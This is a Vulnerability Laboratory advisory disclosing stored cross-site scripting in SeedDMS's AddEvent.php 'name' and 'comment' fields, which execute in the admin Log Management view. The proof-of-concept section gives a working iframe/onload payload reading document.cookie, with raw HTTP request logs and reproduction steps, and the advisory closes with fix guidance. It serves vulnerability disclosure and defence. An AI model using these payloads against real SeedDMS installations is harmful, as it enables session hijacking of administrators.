@@ -1,0 +1,352 @@
+# Title: SeedDMS 5.1.18 - Persistent Cross-Site Scripting
+# Author: Vulnerability Laboratory
+# Date: 2020-04-15
+# Vendor: https://www.seeddms.org
+# Software Link: https://www.seeddms.org/index.php?id=7
+# CVE: N/A
+
+Document Title:
+===============
+SeedDMS v5.1.18 - Multiple Persistent Web Vulnerabilities
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2209
+
+
+Release Date:
+=============
+2020-04-15
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+2209
+
+
+Common Vulnerability Scoring System:
+====================================
+4.3
+
+
+Vulnerability Class:
+====================
+Cross Site Scripting - Persistent
+
+
+Current Estimated Price:
+========================
+1.000€ - 2.000€
+
+
+Product & Service Introduction:
+===============================
+SeedDMS is a free document management system with an easy to use web
+based user interface. It is based on PHP and
+MySQL or sqlite3 and runs on Linux, MacOS and Windows. Many years of
+development has made it a mature, powerful
+and enterprise ready platform for sharing and storing documents. It's
+fully compatible with its predecessor LetoDMS.
+
+(Copy of the Homepage: https://www.seeddms.org/index.php?id=2 &
+https://www.seeddms.org/index.php?id=7 )
+
+
+Abstract Advisory Information:
+==============================
+The vulnerability laboratory core research team discovered multiple
+persistent vulnerabilities in the SeedDMS v5.1.16 & v5.1.18 web-application.
+
+
+Affected Product(s):
+====================
+Uwe Steinmann
+Product: SeedDMS - Content Management System  v4.3.37, v5.0.13, v5.1.14,
+v5.1.16, v5.1.18 and v6.0.7
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-04-15: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+Medium
+
+
+Authentication Type:
+====================
+Restricted authentication (user/moderator) - User privileges
+
+
+User Interaction:
+=================
+Low User Interaction
+
+
+Disclosure Type:
+================
+Independent Security Research
+
+
+Technical Details & Description:
+================================
+Multiple persistent cross site web vulnerabilities has been discovered
+in the SeedDMS v4.3.37, v5.0.13, v5.1.14 and v6.0.7 web-application.
+The vulnerability allows remote attackers to inject own malicious script
+codes with persistent attack vector to compromise browser to
+web-application requests from the application-side.
+
+The persistent cross site scripting web vulnerabilities are located in
+the `name` and `comment` parameter of the `AddEvent.php` file.
+Remote attackers are able to add an own event via op.AddEvent with
+malicious script codes. The request method to inject is POST
+and the attack vector is located on the application-side. After the
+inject the execution occurs in the admin panel within the
+`Log Management` - `Webdav` and `Web` on view. The content of the
+comment and name is unescaped pushed inside of the logs with
+a html/js template. Thus allows an attacker to remotly exploit the issue
+by a simple post inject from outside with lower privileges.
+
+Successful exploitation of the vulnerability results in session
+hijacking, persistent phishing attacks, persistent external redirects
+to malicious source and persistent manipulation of affected or connected
+application modules.
+
+Request Method(s):
+[+] POST
+
+Vulnerable Module(s):
+[+] op.AddEvent (AddEvent.php)
+
+Vulnerable Parameter(s):
+[+] name
+[+] comment
+
+Affected Module(s):
+[+] Log Management (out.LogManagement.php)
+
+
+Proof of Concept (PoC):
+=======================
+The persistent web vulnerability can be exploited by remote attackers
+with low privileged web-application user account and low user interaction.
+For security demonstration or to reproduce the security web
+vulnerability follow the provided information and steps below to continue.
+
+
+Manual steps to reproduce the vulnerability ...
+1. Start your local webbrowser and tamper the http protocol session
+2. Open the AddEvent.php and add a new event
+3. Insert your script code test payload inside the Name or Comments path
+4. Save or submit the entry with error
+Note: Now the web and webdav log has captured the insert or erro
+5. Now wait until the administrator previews in the log management the
+web or webdav view function
+6. Successful reproduce of the persistent web vulnerability!
+
+
+PoC: Vulnerable Source (Log Management - View)
+<pre>Apr 13 19:23:22  [info] admin (localhost) op.RemoveLog
+?logname=20200413.log
+Apr 13 19:29:53  [info] admin (localhost) op.AddEvent ?name="<iframe
+src="evil.source" onload="alert(document.cookie)"></iframe>
+&comment=<iframe src="evil.source"
+onload="alert(document.cookie)"></iframe>&from=1586728800&to=1586815199
+</pre>
+
+
+PoC: Payload
+>"<iframe%20src=evil.source%20onload=alert(document.cookie)></iframe>
+
+
+--- PoC Session Logs (POST) ---
+https://SeedDMS.localhost:8080/out/out.AddEvent.php
+Host: SeedDMS.localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Referer: https://SeedDMS.localhost:8080/out/out.Calendar.php?mode=y
+Cookie: mydms_session=b0496ccee96aa571a3ca486b8738c312
+-
+GET: HTTP/1.1 200 OK
+Server: Apache/2.4.25 (Debian)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 2973
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+-
+https://SeedDMS.localhost:8080/op/op.AddEvent.php
+Host: SeedDMS.localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 356
+Origin: https://SeedDMS.localhost:8080
+Connection: keep-alive
+Referer: https://SeedDMS.localhost:8080/out/out.AddEvent.php
+Cookie: mydms_session=b0496ccee96aa571a3ca486b8738c312
+from=2020-04-13&to=2020-04-13
+&name=>"<iframe src=evil.source
+onload=alert(document.cookie)></iframe>&comment=>"<iframe
+src=evil.source onload=alert(document.cookie)></iframe>
+-
+POST: HTTP/1.1 302 Found
+Server: Apache/2.4.25 (Debian)
+Location: ../out/out.Calendar.php?mode=w&day=13&year=2020&month=04
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+Note: Injection Point via Calender op.AddEvent Name & Comment
+
+
+
+--- PoC Session Logs (GET) ---
+https://SeedDMS.localhost:8080/out/out.LogManagement.php?logname=20200413.log
+Host: SeedDMS.localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept: text/html, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+X-Requested-With: XMLHttpRequest
+Connection: keep-alive
+Referer: https://SeedDMS.localhost:8080/out/out.LogManagement.php
+Cookie: mydms_session=b0496ccee96aa571a3ca486b8738c312
+-
+GET: HTTP/1.1 200 OK
+Server: Apache/2.4.25 (Debian)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 273
+Keep-Alive: timeout=5, max=94
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+-
+https://SeedDMS.localhost:8080/out/evil.source
+Host: SeedDMS.localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)
+Gecko/20100101 Firefox/75.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Referer: https://SeedDMS.localhost:8080/out/out.LogManagement.php
+Cookie: mydms_session=b0496ccee96aa571a3ca486b8738c312
+Upgrade-Insecure-Requests: 1
+-
+GET: HTTP/1.1 302 Found
+Server: Apache/2.4.25 (Debian)
+Location: /out/out.ViewFolder.php
+Content-Length: 0
+Keep-Alive: timeout=5, max=93
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+Note: Execution Point via Log Management (AP) on Webdav View or Web View
+
+
+
+Reference(s):
+https://SeedDMS.localhost:8080/
+https://SeedDMS.localhost:8080/op/op.AddEvent.php
+https://SeedDMS.localhost:8080/out/out.ViewFolder.php
+https://SeedDMS.localhost:8080/out/out.AddEvent.php
+https://SeedDMS.localhost:8080/out/out.LogManagement.php
+https://SeedDMS.localhost:8080/out/out.Calendar.php?mode=
+https://SeedDMS.localhost:8080/out/out.LogManagement.php?logname=
+
+
+Solution - Fix & Patch:
+=======================
+1. Parse and escape the name and comment input field on transmit to sanitize
+2. Filter and restrict the input field of the name and comments
+parameter for special chars to prevent injects
+3. Parse the output location of all web and webdav logfiles to prevent
+the execution point
+
+
+Security Risk:
+==============
+The security risk of the persistent cross site web vulnerabilities in
+the seeddms web-application are estimated as medium.
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+Benjamin Kunz Mejri -
+https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without
+any warranty. Vulnerability Lab disclaims all warranties,
+either expressed or implied, including the warranties of merchantability
+and capability for a particular purpose. Vulnerability-Lab
+or its suppliers are not liable in any case of damage, including direct,
+indirect, incidental, consequential loss of business profits
+or special damages, even if Vulnerability-Lab or its suppliers have been
+advised of the possibility of such damages. Some states do
+not allow the exclusion or limitation of liability for consequential or
+incidental damages so the foregoing limitation may not apply.
+We do not approve or encourage anybody to break any licenses, policies,
+deface websites, hack into databases or trade with stolen data.
+
+Domains:    www.vulnerability-lab.com		www.vuln-lab.com			
+www.vulnerability-db.com
+Services:   magazine.vulnerability-lab.com
+paste.vulnerability-db.com 			infosec.vulnerability-db.com
+Social:	    twitter.com/vuln_lab		facebook.com/VulnerabilityLab 		
+youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php
+vulnerability-lab.com/rss/rss_upcoming.php
+vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php
+vulnerability-lab.com/register.php
+vulnerability-lab.com/list-of-bug-bounty-programs.php
+
+Any modified copy or reproduction, including partially usages, of this
+file requires authorization from Vulnerability Laboratory.
+Permission to electronically redistribute this alert in its unmodified
+form is granted. All other rights, including the use of other
+media, are reserved by Vulnerability-Lab Research Team or its suppliers.
+All pictures, texts, advisories, source code, videos and other
+information on this website is trademark of vulnerability-lab team & the
+specific authors or managers. To record, list, modify, use or
+edit our material contact (admin@ or research@) to get a ask permission.
+
+				    Copyright © 2020 | Vulnerability Laboratory - [Evolution
+Security GmbH]™
+
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
